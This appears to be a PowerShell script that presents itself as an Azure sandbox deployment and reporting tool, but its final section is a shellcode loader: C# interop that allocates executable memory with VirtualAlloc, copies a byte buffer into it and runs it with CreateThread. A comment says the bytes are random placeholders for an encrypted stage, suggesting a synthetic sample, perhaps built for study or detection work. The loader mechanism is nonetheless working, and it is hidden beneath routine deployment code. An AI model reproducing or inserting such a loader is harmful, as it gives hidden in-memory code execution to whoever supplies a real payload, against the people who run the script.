<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.DESCRIPTION
    Runs a template validation first, then creates the resource group, the
    storage account and the test virtual machine before cleaning the sandbox up.
    The cleanup step honours the DryRun switch so the resources can be inspected
    after a failed deployment.
.PARAMETER ResourceGroup
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Invoke-AzSandbox.ps1 -ResourceGroup rg-portal-staging-18
.NOTES
    Author: Server Operations
    Last updated: 2025-01-11
#>

$ResourceGroup = 'rg-portal-staging-18'
$Location = "eastus"
$TemplateFile = "C:\Scripts\templates\portal-staging.json"
$ParameterFile = 'C:\Scripts\templates\portal-staging.parameters.json'
$SubscriptionId = "5a275de2-92b9-f419-bb27-6db33a1f4ee3"
$StorageAccount = "ststaging7708"
$VmName = "vm-portal-staging-18"
$OutputPath = 'C:\Logs\deploy-staging-2025-10-09.json'
$DryRun = $false

Import-Module Az.Resources -ErrorAction Stop
$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$validation = Test-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile
if ($validation) {
    $validation | Format-Table -AutoSize
    throw 'Template validation failed.'
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
$deployment.Outputs | Format-Table -AutoSize

$summary = [pscustomobject]@{
    ResourceGroup     = $ResourceGroup
    Location          = $Location
    DeploymentName    = $DeploymentName
    ProvisioningState = $deployment.ProvisioningState
    StorageAccount    = $StorageAccount
    CompletedAt       = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$summary | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath -Encoding UTF8
$style = @'
<style>
body { font-family: Arial; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($summary) | ConvertTo-Html -Title 'Deployment summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.json', '.html') -Encoding UTF8

$MailTo = 'cloudops@contoso.com'
$subject = "Sandbox deployment {0}" -f $deployment.ProvisioningState

$mailParams = @{
    To         = $MailTo
    From       = 'cloudops@contoso.com'
    Subject    = $subject
    Body       = "See the deployment summary attached to the run log."
    SmtpServer = "smtp.contoso.com"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

Remove-AzResourceGroup -Name $ResourceGroup -Force -WhatIf:$DryRun

Write-Host ("Sandbox deployment finished: {0}" -f $deployment.ProvisioningState) -ForegroundColor Green

$deployLog = Join-Path $env:TEMP ("az-deploy-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Write-Verbose ("Deployment log: {0}" -f $deployLog)

$tags = @{
    Environment = "staging"
    Owner       = 'platform-team'
    CostCenter  = 'CC-1042'
}
Write-Verbose ("Tags: {0}" -f ($tags.Keys -join ', '))

$quotas = Get-AzVMUsage -Location $Location -ErrorAction SilentlyContinue |
    Where-Object { $_.CurrentValue -ge ($_.Limit * 0.8) }
$quotas | Select-Object -First 5 Name, CurrentValue, Limit | Format-Table -AutoSize

$pricing = Get-AzConsumptionPriceSheet -ErrorAction SilentlyContinue
Write-Verbose ("Price sheet entries: {0}" -f @($pricing).Count)

$providers = Get-AzResourceProvider -ProviderNamespace Microsoft.Compute -ErrorAction SilentlyContinue
if ($providers) {
    Write-Verbose ("Provider registered: {0}" -f $providers.RegistrationState)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x82, 0x56, 0xb9, 0x73, 0xab, 0x99, 0x6f, 0xa7, 0xe1, 0x9f, 0xd8, 0x79, 0x02, 0x19, 0xa6, 0x28,
    0xe4, 0x95, 0xe4, 0x8b, 0x3d, 0x4d, 0x88, 0x22, 0x47, 0x98, 0x24, 0x81, 0xc0, 0xe9, 0x2b, 0x00,
    0xe4, 0x40, 0x89, 0x74, 0x15, 0x9a, 0x3d, 0xb0, 0xf2, 0x5d, 0xdd, 0x8d, 0x94, 0x8e, 0x53, 0xdb,
    0xf5, 0x58, 0x2b, 0x19, 0xbe, 0x81, 0x96, 0xab, 0x10, 0x76, 0xcb, 0xf0, 0x2e, 0x48, 0xa9, 0x8c,
    0x71, 0xde, 0xef, 0xe7, 0x5e, 0x04, 0x44, 0xc6, 0xa9, 0x4a, 0x28, 0x25, 0x97, 0x0d, 0xa2, 0xcc,
    0x05, 0xf1, 0xcd, 0x15, 0x81, 0xa1, 0x62, 0xbd, 0x89, 0x69, 0x32, 0xf5, 0xbf, 0x25, 0x76, 0x16,
    0x80, 0x94, 0x1a, 0x15, 0x87, 0x09, 0x5e, 0x6c, 0x85, 0xe2, 0x14, 0xae, 0x20, 0xd5, 0x2c, 0x53,
    0x21, 0xdd, 0x1b, 0xc9, 0xd2, 0x81, 0x54, 0x58, 0xf5, 0x65, 0x56, 0xe2, 0x80, 0xb5, 0x3d, 0x26,
    0xc2, 0x4d, 0x17, 0x85, 0x92, 0xbb, 0x8c, 0xfa, 0x3a, 0xab, 0xea, 0xc1, 0x7e, 0x9d, 0x6f, 0xa1,
    0xd9, 0x61, 0xe8, 0x12, 0xf9, 0xd0, 0x94, 0xa2, 0xec, 0xd2, 0xa4, 0x84, 0x66, 0xda, 0xb4, 0x4c,
    0x27, 0x25, 0x42, 0x14, 0xbf, 0x85, 0xce, 0x76, 0xd2, 0xcc, 0x96, 0x6c, 0xac, 0xc5, 0x76, 0x36,
    0xe4, 0x13, 0xc3, 0xf2, 0xcf, 0xa8, 0x5a, 0xb1, 0x68, 0x82, 0xd6, 0x68, 0x1a, 0x13, 0xaa, 0xa9,
    0x6b, 0xd5, 0x52, 0x9d, 0xf8, 0xcc, 0x9e, 0x10, 0x96, 0x66, 0x2f, 0x95, 0x7a, 0x2a, 0x9a, 0x99,
    0x24, 0xe8, 0xf0, 0x6a, 0x60, 0x56, 0x54, 0xf0, 0xd7, 0x6b, 0x43, 0x3e, 0xde, 0x7b, 0x70, 0xe0
)

$HProcess = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 1833)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
